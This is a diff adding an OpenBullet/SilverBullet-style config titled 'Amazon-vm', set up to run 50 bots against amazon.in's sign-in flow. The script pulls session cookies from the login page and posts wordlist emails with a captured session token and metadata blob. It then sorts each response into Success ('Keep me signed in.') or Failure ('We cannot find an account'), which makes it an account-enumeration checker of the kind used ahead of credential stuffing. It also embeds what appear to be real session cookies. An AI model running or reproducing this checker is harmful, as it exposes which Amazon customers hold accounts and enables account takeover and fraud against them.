@@ -1,0 +1,143 @@
+[SETTINGS]
+{
+  "Name": "Amazon-vm",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2024-03-31T05:23:50.0277928-07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@Crain_1",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "ccxc",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST GET "https://www.amazon.in/ap/signin" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate, br, zstd" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Content-Length: 10685" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Cookie: session-id=261-0526786-8541537; i18n-prefs=INR; ubid-acbin=260-2514760-0126113; session-token=KzybkjIaBohxRPw3TIlqHTTZMwyZKribdgWMQY5Px82GVFXCeq1IZi2mwOMtiajP1te7emXILN3JBJbqKINk2zFPrC2+vhhuQZwdzk5w9O7YsJlVrgUIRjE16MMeTCjZIttxUuvxD/CLzf9KafXrA0FnMg3+qcOKgvvlGGUOPutbVaUP8HbiSEo94iQT8Y8/ZGBj++1pttI/F/ZzdqfVXag50HuGWb3jKy6EJNRCLcHEVcRFDO51oh11Z4UQ88FT50AzyCIr5NKeOJrQ3KLL4ECTGtiUSyunXQoA7JQe/rpF5fVmGLy99uxccJNkNmznw8zBwwSkEvUt2+dbjzUBYBrhpyUYc7Zf; session-id-time=2342537228l; csm-hit=tb:EV78MBKHTG592NDBHCZD+s-1SEZX6N49PCNDZ84BZCY|1711817234341&t:1711817234341&adb:adblk_no" 
+  HEADER "Device-Memory: 8" 
+  HEADER "Downlink: 1.45" 
+  HEADER "Dpr: 1.25" 
+  HEADER "Ect: 3g" 
+  HEADER "Origin: https://www.amazon.in" 
+  HEADER "Referer: https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_custrec_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" 
+  HEADER "Rtt: 300" 
+  HEADER "Sec-Ch-Device-Memory: 8" 
+  HEADER "Sec-Ch-Dpr: 1.25" 
+  HEADER "Sec-Ch-Ua: \"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Sec-Ch-Ua-Platform-Version: \"10.0.0\"" 
+  HEADER "Sec-Ch-Viewport-Width: 423" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" 
+  HEADER "Viewport-Width: 423" 
+
+PARSE "<COOKIES(session-id)>" LR "" "" -> VAR "1" 
+
+PARSE "<COOKIES(session-id-time)>" LR "" "" -> VAR "4" 
+
+PARSE "<COOKIES(session-token)>" LR "" "" -> VAR "3" 
+
+PARSE "<COOKIES(ubid-acbin)>" LR "" "" -> VAR "2" 
+
+FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+REQUEST POST "https://www.amazon.in/ap/signin" 
+  CONTENT "appActionToken=PEj2FY6l0vEm5NyaOsqHmTd28Kpocj3D&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&openid.return_to=ape%3AaHR0cHM6Ly93d3cuYW1hem9uLmluLz9yZWZfPW5hdl9jdXN0cmVjX3NpZ25pbg%3D%3D&prevRID=ape%3AMVNFWlg2TjQ5UENORFo4NEJaQ1k%3D&workflowState=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.ZYWOfPlelOJ9wzvukfJdUVuGPJF6p65K9VuNXMuCMOPrmfNzPxuGBw.-vQNX7r0wY2lslvx.gRCk6Dki2VnZXXCOvmu2_-oHYwqywlkFLK26jdNdsrtFk0-S8lVzS6RcJoJ9GnwF5IhWdhnXChz7laKBPXNhTEheshRCFD8irzUea_dZB7ZNx4NwImZ6JQAVOxDopZJ_Cs09cLIWuTztA5kcPtHiZRzLbesK1gRX-ef0OHHlVg_4MWxC7DQbCQZPxu-y71c2uCwl_mKmLvaTHD9SmWeTbWaQ0wr3lQuAfl-1Vmo4WhfnoKQhxUOg9zreJ-CacdIf2Szy8-ANjcipON4os3Vi-gfFCyfqzWn8hb55Rf6zjChDBn8M07CUj85s53izZKsP.8VlW4d7jb2obmn6OUTmQKw&email=<US>&password=&create=0&metadata1=ECdITeCs%3AMMIPHu%2FimejolstjIKU8mUjolwx2qF1Gu1Z%2FOKeGb4fEY8E2h8S%2BzllfzwYOvuv%2FbnL7Lk99RB%2FPInTHS8zKSV6J9zgJPcqOXVaxA1NSerUS6lKRgf4wmUVgNNxdYuew3bvvcpILzlGwXI8HbFTNiyMqREtl8g65i6gsYBI7t8ZdrIk2HMUoHcVsvP2XYWA8gRCd%2FYMYE3kgiiWzhIqOEyBbEHcG2ltqn8%2F8RtVVXKBSXm1lmuQTpyb0wI%2BZqsXhumHx%2BLNaAPg1%2FBK66Z71bS8IrGKG7sgu4uagaFM0wor4Gsx0E0XXI3K2gdD5t54l0ZRdBlwrlYJoortKxG3KG3Lx5CeffgyR%2F2NHS62tqmVYgNvYKcHlHV%2Fud%2FXzut%2BzkqNOjCRtKKdbo3%2FtOJtO4ddr8QY%2F37KJr6ii09BB8ejQtbnyIwsEnZ7FzKE5OkqmnG1G89TKtey%2F%2B6bG8bYx%2Fedcw93wQRcldJAjojSHG1XFnXDSYabn7kiqsq9IIDK97y%2FkR55OudoeUeh9a1HAKAtFHO8dwTG7Ewwoy392KdGTp7%2B9wd40j%2F0BA8OuNffHuO7glzOfuRexBNQ%2FcXpUwaQ%2FMa63T%2F2vBU7fH8RfZeyP9hIP1FnH0T81nLv26nbOgHWXDqsGiAcGe60Nwluekd%2BH%2FRmIBLQpL5Zstn4GTOhCkyxD6SZKNMX9CWe%2Fi0tKs1TSkda0fzubWkr%2FBrMKXkU%2BWkzErqsuL5UQ4SR6RVZaejoghEDS5e0s7b71L0HIR0n7jQtopOYTgTaQ4MgpwqJVrTdBDqWisU19BVK%2B9xKuC1wOY2U6fbTZJrR7x1%2BdRE2ba6fVjjeTcmVDsu6YKBzikP7DvvLu3wRSmtXypJ6g3ij46N1bbSRX6iN5ZtsA6c13b%2BVG1YPORJNogdbfllri1%2B4407otDlTeiiccRweRUnYFaTWUBp6yzrmz3Zj0obkhkLnLY5pazc6mC5VYJSmPSk7ojSPMNocoeanYBbGDAP8WZpl8hBKEP1K1C0xT8yHdQYb%2F9JiUHFTXIu4trjtj1S6TOXpYXUlsuZhugerCP8jWoFe%2FbingkppSP0CUZrJFrOvW0tZUXud57NvZSdBAxRTWOwlcjUdoVHwp581lpURH%2BoEftijMI40XO2jUmlYNkTDZoVYGA2jNfq00j2km2Q7AFJvjqH5Ko9HTJ0esrD0IXJN5FFXmOzeXnW%2FY4PQr7cIyHPb65RG25t2MbSaecNMeVcX%2BR5jo4y2pe1q827YSrE0bRwn00BgOHI25VdQcxhoMG5E1aElMpEe9HGdLEvcU8gkMBgjPuyEIa8Boxicq9lOdrBvjKiCLQ%2B7tAByide52QSA%2FgQTNm%2BS0zrITrel2cT3aTPMzZGwwIgl2bOUiuAFleKUA0teDsZvDKEji66jGrzVaEe2Qv334YqxyyQjzg5MzoBSxhpFe43%2BysU18SahDsxGqWHhDve9SQMwPOrEB8cHhpqpkdXlaqRmco%2F2IkTInYwmFVj%2FXC9of4UxmWq1C3JbdpCfNUpG%2BI%2FAij7dH%2B7eMMS7kSp3kwv1k%2F0va6cBBrdNbnkihpb0ucCw3EydKwFczHANXCv%2FP41G2Bc6NAB8SG%2BJ5fVjfwdy2xV4OmUAjn4o4YRmoEGeYA9TPBO1lLkw9y1Me3tLqXrdFF3X8dXgsI%2BoY%2FkmibyrtOLPrZAbEdfj%2FaoZHwTFoEkBosuAAeTBiv5ppzDQ7JaRprOUdQ0bIcANKl%2BtpsoMX7wSBknW3D5wG3FHN4cwdpGo%2BDxtvABvIjBnixliUYMJvfGMmbnQ96rLDaDg8ON5QGjqpqNLTB1szoxlwHPLPeDQai9y%2Bi5fe84bPyogD5ZAXkhowGSw7jPemZFsnmF5nsUKSy8QQY9sqIiFBJp%2Bsb%2BmM%2FFDToDcKKLnZ%2BfiAOGHv8xHxmMDoAmNq1BqW6gxXYkii2jYMo5IAn4FttrcOhww%2FJfoHFt2bGXLbP3y35k925dGni1Fjk%2Fa%2BsuEn4UfZDdYVvYNmA3unWfTQOzjBm37U2f8eFoNyJt3kED3pyawCGAjza9ZiEC3RptlPQx%2Bs8fFiHdUJh79bIfr2kA8uy2jwtA%2BSfQLaFk8MBI2bmXJlhP0HW2EkJHjScCqjlFSR7wRlt3nBISmUhp2aiPWyJ9t4w9X0U1FBFFj6VriB%2FhW2eien1LCLWmnuHW%2FOmAALturkG0XgeMrIdwF8KdyfPC5feisvnahfkXe4yOoQpO1pTnuvyopt1YJr%2BlMyfhcIrqMa2BkfzFhvZgozCJZG2SRvpFGregmKAw7vhTHtQ7BYkQIKxEYyplnB2SKX36HE0lEkC1hJsog8vq9WfHT8bGhiyLgbG%2FUJMjIn29ZOwGt2Zse5f%2FhEApJyRvYrm050pY0JDTI5AZto%2FtCxSgd666I4xaUBCxy30JPl3u2%2FdlfR1z2K%2F3jOthUmoiZ%2BWOHkJJQppXoEvDbcUQZoyLFcx0TzOzQ6kUvwOr%2FiZDmb9BrEO35jQPn62mLPyfBQcQoPsdgXsktI1ZE3Y98%2BtTMMjoNYthTRU%2B8KZ9C0LnIBsvYQjKJNvTvRM0TUnGvbq2MTjF3OnEVVEKf1%2Brr4rzFNTtrtVVAuTRfbybYX8ij3zg7cHPueZEwp7TuMzhVzFXLzqHJKmLYXxn12ZAsE%2Fftixl%2F17quCO%2BWB%2BSnPvmeVuyJCACQoozAkqdJ2V0vsAZ%2B9DM2XQHw5Cq4Ym82ey9XgQvC2DTq0f5GSSPTYxyWKxwmBgPMeJg4L1xvk2LZcrFp%2BmJyBVyFJ%2F1xD%2Fdm040mfOOn7ZdXvkI4d%2FZDsSYNz4%2BALVCDeNsbF1%2Fousmzx0xt6psIxTdT9CUR7YeOpMpu%2BDn%2Bf0DFOpgLfQTaoulLk%2FJ7G8AzSFecZ3lsl5cwC4LW9Mwslrxk896TBVm7K%2BOIHHRuGYEeNLtN7FesFHrZyfXLYj8lSZ7w%2BmeBSshnZySLY2YnYl130CzEHnJ3hRSvt5nTGoT%2FALLWL3bMkX3ihXtrm7Xw2%2F2pMRjyEwwIHPY07wfN8AhH5Rs2oPBjM3W80OabJJGCUuzGbxrt0gONsYn%2Fu11Wtas4LuC%2BegQFtf2lndFiBtxfvr2h2fpwNxqAuQPIe%2BXtIdXt7yg1Yl9eLqisBOngQD25c5z%2F3B8HddYlHLrjzShin6GUKPoMKdS%2FbOJAj40eSFD2T2kdaoJYapnNuERZCAyI5nqXYJCOseA4NC9yL0AzvAK%2BIoNTMoeT%2BskhoyzUTklY2hEQ90XTpk0ZNpFI73b8grBYuPkKZYR8T1SYoMRpjzylfvfavU0f7WJeZojjA3FoS8aKwcr9nBhAJia%2F28x5q3kOr27%2BLt6IoXy%2BMFmNl%2Bvd8n%2BaR7Qvoc9P7MCuc3Sg0uKtrmkmwZTy2Wl2ZdxT9zhKHMG7YRrSUVns6bEmsIXwx9PT6qDgWBzTcDdgRA9C%2F%2BUYBlVWZE90PZS6THC3YSm4NwSGiN8w7w9fzdBDcL9PPPO%2Bytise6xfGvsNYq9uzSWnCo1tr2Yhbk8A%2B4Z7YGJTsSl0RrtGHsaj3EFby4xctmXZUQWdgcgfxZ4g73MKZqf5yU%2F9RDHxaWsDP7l%2Fy2QC%2B6%2FMzLbXEnLg5l%2Bm%2F4zMAWhy80sAW17FDlbGj8mCTDYeWlW0KrN1HUG9mD%2FZg95b5%2FWg%2FQYVYFTE07PBITWgvdEJh%2Fgn9sumlTZFo7Vjou4%2BUftUfBOqQEBVlAPjWIPa692XUDDo%2BB5gypuQbRD1mLTHRL9eWQfNTCv76FYzumTKHmKV0nZWH6OcBYh0fjfv1uOUQPIAXm%2FvpmzxMmjLe0dE3Ymuvkx%2Fs0PML1xqJ%2BcRdukfnfs7qFpY2vsvGyXRpmO8c18phLlAILEzhLxYj%2BGTnjt7%2B2i7uEpm0GP47FnbfvIVvetwSarBavq486KwHk%2FSrThROETC25PJFueV189PyaXZUUWI4UpU2T5rTjEkzb3%2B1XmJ%2FJ2Hzxf8mo7ZcU4QOTegFMtCtkDI3mOEG%2FucaHBilwIF2QiTmd%2BkyHp1QABjVJ8Yh%2BQP0U%2B0JRbbh570k95CG%2BcgXphLasZLCf7yAhGyIa4Uq8ZCtktuF5FCcpcxJ7Jogtq7IMEzGFNU05bwW32uEKAfFjgmVfyuGAycGKsGi6wj461RSvE41KHJo4Q4uXBSbbHNF7rPjVkMD4zhOwokpPbX4baAWNSE45VBH6Zf%2Bb5%2F8cM%2FyDOexOFtRoYxEkks6XV1TE8iAHceAN%2BjLGu4bJfHZk%2BMXCQqWVctYFjqZRs2DFyOpoepJUePOEKwSZoNSewXSsbDuHwNpOZZEZWoaShaLrLH1FMsMKAG07TWSdP3blESrpwVc1fsVKOHC9KRA2k80QoaxAb90GDbN9OOLDi6KdZq7TjkZGnN9%2BGLjxyH7QArx7pbIrWbYny2GjnKGfPTJdOPk7JLYjkjGLxz6pTrzgLO83cHYQavL4HEZorSeTX%2FEq0GgY%2BGQdGEsLnGVmKTJn1wFeT4vrWCFxysloCulylvv53TWnXtz8UY1eUaJ1j2%2BMRnfLwwkdKMwfJXHKKOaSxHJlirICcziVPxvgpmxE8iAFRcPPOyvPrpnYV6GsEPsO%2F1jDAhbqhXt418a4KOPM%2F5Ag%2BxDPhH9vG9gGuCnkCijC9KoZYTAt26BaLdZiIcQLp6sR%2BCrOL3YelgiRigTutXhZFA1zDPvmtUsD1YveKW3H0eC3qrDt4YlWiONM2dbEiS%2BMLOpTJTQ%2F%2BPX4F6DziZlNkyxe8ejwaeENWq%2FVFurK6gaGP24LcmvBNJxn7SS%2BkrRRYt76k%2F5GrNgsYvpIyF63CeinueK7ARbsoGTIps%2BRa99hE6AU6aRpJQuLwOjXuuHpRusR0ViRseL0q5ngkdOd9eORYjOYo4YAncIKuDjK1VOGjZDwzIh1k2mbkThu7ALvA1jXi9omw%2FIxR34Z1R3%2BbRByA1FQshQFF7Sr2hGva0yVPX4EudwT86lUz6zrlsIjjjo3DUQxsW2cO4Gi9izeej91NDWuiuyFTG7lIavFLoz2ugl%2BJILzb8SaZIHMB2krAGLHA3Rb4dUEZN1nog45g4t9T3kifjiAt3Sw8tXE1RHtgYe8xZ9t6c9jlRa31%2F2zEmy%2FZZZqClSf5CrkRg7Oxo2O6hl%2F%2FNVgA1p74B3X2crxuurlQvJEYB%2B%2BxEV5Ifw4bO5uDeG2tOZEj2S9j6LS55W3z2vjkJ7PY1Ay856UDbECMPZOeT%2FEtuLwQg6FcZTZR58RN20sDDp2vnqJVUfJci%2FY%2BKXcWExAJ18oaSzyYtRVtX4%2BBEchUQL%2BqEQ4um6pSHYRDA8fi%2Begkdsw%2F4Xv%2Fee5bsuR%2BfOabBitvm9G%2FOmREzvGWEQMM4EJcLJ%2FEZxjYaqFunk7yjJaOU11I4QpMU1o0BKzTuizk5Kar8%2BMdTLm6kBAgWVFcF9cu8tkI7MJyuLe34gdZ1B6Fwo1O4xB4pUjzvxcmDZmL2b1MM%2F5N4Pd7GOKOsSN8FEceegpHagFfouznQS93ivD3Yv56dNSAJ3iZeCk137wRmuWvE78uL3p6AXCp%2FonKGWX5PoMPd0i9mEqxEXQ2zrVs31jJ43anMOSjNXCtk2B5CTmp0m2ZBHFgXCNsRhbMN8L6CX%2B7Tx72tPssPjc37077ijrX%2F6xUHZsdzftHzk23IvHaYPn1zrhvyf47QMuvs0Kfv5PRaT%2BL7HBz0DCTRy7OL2ylPWZUHg1gh6IEGx%2FtDeRnAVVSicrWEpqriRz%2BvV7dJeGvArkud0n5iRPd8Jftl7MujRPwbamrs8yDlcreYGdsXgvwzJrqCbpc6Tx7HrtZp3MFkZYKrLenw6xFx%2Fux0%2Fmmi8HVvk5rO6%2FqKqZvOTRRmeNYxg5w19GC9hZOGPMVe%2FPQBv5ON%2F04YZNSNwpsiT5TfakD6jKcKHfTlo6rkxvQtjnjqlKjKzMMglmuTOJEBQfTRcS67SWX25ffvodFGDnx3Z7zwvHvpzMQXana20DJ25p8dII5Nqj8kCKjSzEPvBhaOolAZzarzqhhn%2Bn1bhLk1pKl6iAiNkrhOEWCPZ51PGtN2a9i1aEI6uzYsUCmkvqB%2FDdWzUcSS%2FzIgLo4Stf5It9T9jC%2B75Ez1rjiXIU92AmvPqjT9p%2FYh4EGJDXn2Punkuz80gMU3wR07kG8QdBlrEf%2BzeQYABlqhDYJCg9qpsBy0JckNG9DkvvJ65UeImmtrEXa75V%2B4e6zg0%2B3MKA7wuOXLJBwcys7yoSavhA%2B%2BM39wZXW6ejqLiXrHbfznZ06Dx5pc%2FTRX7bz6CxG1FEG%2FxuE4NOLJgnMSA4obGDU4rqCkQwQyDTK2xF0kB49%2B9S%2FvHbK4ij8zj5asobZoSR9atj6%2B%2BAgYbqJv8XLD8RzbWsHuwEf0dRBGbfYgpzHOq7FxNg6ek1scbkpVmBBkmOOp%2BRY1IhV8TVQBW6QS%2FkbRK7p2LppnEo52QTzdEgy%2FuSjW3rnIFiLs7XwA4viStkaSbys5k3v%2FJNrF0ymLEWoK6y%2Fe%2FL6NnEFHMeTw2DXLl2AF0bPBayKuOGU8s8zH3JPmGIb1WEQ6h1IUxCdqHhwpzWEW%2FcoFOQsGDMdRo8RznpAtaAg7fchucLPGYL2brHqaNllyBN2dDbZlfhuou%2FjpxaZWIb752r5YLU5jbCYReq%2FfXcRLqjxa7keOaYcMFl6K0AXC6PTb8CZbZYDBZBBDFUT22Ut2KmIiUCaOvmetbAY0z6DzO5tLUmq1s3SvFEIYmrteYzpxF98G80AvMQJEzFCvkCHdIeusWri4UKVEbys2pbkxLsXoV%2BSSVO%2Fm%2BF3kmOB9mAPiYz7aShSZJdVLrFcwxNSMYSLaMVVZ7XeHReZJ8l54RdeEO%2BZdrjSxflLqKUMMa5DAasQhlPTCiYw7NY1I9wwO9OMVE5HlKeyLm2bTuz8WPdi7mjpbhnX1Z6a8wNpafh7h2ELF7yDM2QLbDyEq7hlJ08bm5Az9f9C3tZrPRKqcKHNwgh4cpIpVor%2FBwhYTPvu2wgoGpU8lKsRSx8jxyq3D0pj%2B0ASYbKOL233ovuF7TZezVi72QFTiekMWGXtGn4ym6EFnKgwUiCJRrMogP9%2FIF82%2FapZD2BjzyrbsB2UmRXpfnw4QBd0CZ%2BXb%2BADfl5ceoYCNu0WwuQUhyA2yHZdnkbEBr7x799h6f1O2BhDUPCRhI2bz9BTX83MDbiSiR%2Bp9iS%2F6sCu7UQxyVuJESYxmV%2BTvMLiOoTimThXe%2F1ps9Xa8nmbuSPOGsyfvHj9gRCsLD1F9D6yKU3A9eukUznD8Iq7FAnCxSMJcuQ1o6z29VOxWemJysZ9DLtMxqL6hJBCGN5%2BkjDRf6Kn2ZTVP9gzO8F7DrjsBdnyWBbWEuZYJvdb4vywNhkIQ7RocNWAOoEgUm%2BDbwozlfc%2BmZEPd3UlQbZAbhtD83X4982I%2FgBJnjUgrrMs9UCydI6q1AKt0BkEzr0EDMoXJtmsHAkte9A8tihIUuWovQ2ggGP%2FIKJUeL1WDUKt6wQ0AUec8VawX5HHZVMqmdGfSByt4oJ%2FOLeaFBnTI3Euk2CSnz%2FE8pb30hKKPhbZROeZdGKAHm2k33DFiI6Npxy0cwpohjKcCIITV5b00WW12WXX7648DWaEgLC7tAz%2BWPBVWnFxET7%2FpYu7IRAcbN4NcnTgFcjjhIBLNm0UVQkS1OwSyLsx5s5IPxlRDt4%2FTqPs%2Fs%2F%2B7vDQN0yUDr4Sn9l3EEbRWUmiaXvdFpLSKIq0WP5XCFXcidA241qARjOZsx1ho217KKjr6OG7fc4G5IUhPcaaKbuwFEE0RUtnY7EhjVapUXYUK%2BledeeEDk5oMI7H2To2MGFt1UJrWEXKfhq2AUvqqqkIJpGAPq7hSwwt%2B6vyjIOX9rzFmGhy5SDNKvRrg3enj3Ymw1fD5QS47EJoZ33NpawY%2F5b7%2B1Lrj2YYP4ZjrfTAan8z245%2FxBT091JkWqM6pQfPEOweKMOawEjARJ8aeJuf3pN7rwiB%2FYOJ6%2FR%2BZW1rADWFbxh%2BZkzbpqp3kPj%2FnBxg%2FDR95tebcjbKhWAUK1Ca9thgVJeD6IRelMBilc%2FRwrv1Hv0ETTo9%2FlaVkxlj5OZKWmak4xjP8CDR037VrDrFyfdYboScMsQdP69XeAd4R0xsWNOUFjOYtsRI%2FSgZ8n0slkyAwGEblIb8g2oEQgSoo3rRff%2FSoiWpCSAD1Rexgl8z0PCZ85aAjxYgXv83T%2Fohq%2Fszo%2FXUi9U%2BlS%2B15JTu1yC44pxtzhXoPAzrBp%2FJfAIuL4eGckeTIrPP7pgXnWWuxsfuTFhrqXKZk0OhJcMGTLJyCPlr734VpCNylETL4LICnIhDtOSbFYlkNFc2aw0WO1JzeiLIE2jsX6lG2TBdHOYHFSvxSYSbQsSwlhQ2m9FCPrzS9q1Tzj9uKHbCvFmI6U%2FrIHCj6P226vHcR2T0GoQRNg9YyF2GadlXB%2F9i8jI79PX7f30azOJGdyTSi2OofZQxDxTVUqfZimPrQ0B%2B28lnWtuW4QipnnloS9NMJG1WvB2KobTbq3w%2B6nebg5NTaUxlwm%2F71tw29xMN3RpwTXt1HQLyVvpX6EV62McJXZCja2Xr8KqNDEinWRbQC84pTwqVxe3JxxWrByvT1N52ZT20hI%2BTAHavOBkCk5B1Wlc8kIALiNkQZ40r%2FOcLG0xYLvEuIU3oYIhpOnskp6kEwdWTGFbAiZIKFc8LMvvdnEAZWAHqppNHNzOlUTmt1OhMeNAEQDA%2FN9Z8wcJep8ispc%2FXouVY%2BmaKIjoM2pqShific3MdnWBfxJpARgctu7KrGCUZHPkD251ayqwgmu1z1VwIDvFeUgjNRnchCwQsHALikVz1vzS743dOxEWZWk7aLkXnl8nUNajO5rTzQ5lYqixMm8%2FBErb18nb%2F8FS%2F2hhfv4tdik0WN1jo4GRUUmh%2BwMdL9ls5aKhx3SXUq67pklxFGShrR4Uk4txwAd%2B8krWjaKH8USGVCyt%2BR3qU7sMujeEyckDJKo0w4%2BIkuWjdGaSyXMzwZD8hTgwDWK7svyn2L%2BmCgoSzbiOO0r52kuiwnV1VkNMMY%2Btm%2FCE7YjJze8FSZP9u0FOtLr845kNA2RD5qs52QVT%2Fhsd2XRReZUHDMBiON6w1LwMY0zGmLtqpdOpvSlrYIPjP%2BYlAotSHHoWXwgKvVqYaRQ0uKUhqsktF3KN75cBIxXNDcgWWTWHglZQfU%2F96sno53daNsKdybFEa9yRaJSgS5Hbw%3D%3D&aaToken=%7B%22uniqueValidationId%22%3A%22e00f9312-82fb-4cd9-8c03-c8b085022c37%22%7D" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate, br, zstd" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Content-Length: 10685" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Cookie: session-id=<1>; i18n-prefs=INR; ubid-acbin=<2>; session-token=<5>; session-id-time=<4>; csm-hit=tb:EV78MBKHTG592NDBHCZD+s-1SEZX6N49PCNDZ84BZCY|1711817234341&t:1711817234341&adb:adblk_no" 
+  HEADER "Device-Memory: 8" 
+  HEADER "Downlink: 1.45" 
+  HEADER "Dpr: 1.25" 
+  HEADER "Ect: 3g" 
+  HEADER "Origin: https://www.amazon.in" 
+  HEADER "Referer: https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_custrec_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" 
+  HEADER "Rtt: 300" 
+  HEADER "Sec-Ch-Device-Memory: 8" 
+  HEADER "Sec-Ch-Dpr: 1.25" 
+  HEADER "Sec-Ch-Ua: \"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Sec-Ch-Ua-Platform-Version: \"10.0.0\"" 
+  HEADER "Sec-Ch-Viewport-Width: 423" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" 
+  HEADER "Viewport-Width: 423" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "We cannot find an account with that email address" 
+  KEYCHAIN Success OR 
+    KEY "Keep me signed in." 
+
